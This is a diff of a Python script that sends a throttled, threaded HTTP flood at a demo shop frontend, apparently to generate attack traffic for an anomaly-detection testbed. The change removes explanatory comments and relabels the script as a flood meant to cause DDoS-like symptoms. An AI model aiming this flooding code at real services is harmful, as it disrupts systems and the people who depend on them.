@@ -1,9 +1,4 @@
-"""HTTP flood: hammer the frontend with fast, repetitive requests.
-
-Same public endpoint (frontend:8080) as normal traffic, just faster and more
-regular. In the flooded window: call_repetition spikes, temporal_jitter -> 0,
-path_entropy narrows.
-"""
+# an endless flood of requests to the frontend in order to cause DDoS-like symptoms.
 
 import time
 import argparse
@@ -12,24 +7,24 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 
-# cheap high-volume GETs that still fan out internally (a product page hits productcatalog)
+# cheap high-volume GETs that still fan out internally
 FLOOD_PATHS = ["/", "/product/OLJCESPC7Z", "/product/66VCHSJNUP", "/cart"]
 
 STOP = threading.Event()
 
 
 def worker(base_url, label, counters, pause, idx):
-    session = requests.Session()   # reuse the connection so each GET is as cheap as possible
+    session = requests.Session()  
     i = 0
     while not STOP.is_set():
-        path = FLOOD_PATHS[i % len(FLOOD_PATHS)]   # rotate the handful of flood paths
+        path = FLOOD_PATHS[i % len(FLOOD_PATHS)] 
         i += 1
         try:
             r = session.get(base_url + path, timeout=5)
-            counters["ok" if r.status_code < 500 else "err"] += 1   # 5xx = we overwhelmed it
+            counters["ok" if r.status_code < 500 else "err"] += 1   
         except requests.RequestException:
             counters["err"] += 1
-        time.sleep(pause)   # throttle so the cluster stays up, still ~4-5x normal
+        time.sleep(pause)   
 
 
 def main():
@@ -53,7 +48,7 @@ def main():
         try:
             time.sleep(args.duration)
         finally:
-            STOP.set()   # burst over -> stop the workers
+            STOP.set() 
 
     elapsed = time.time() - start
     total = counters["ok"] + counters["err"]
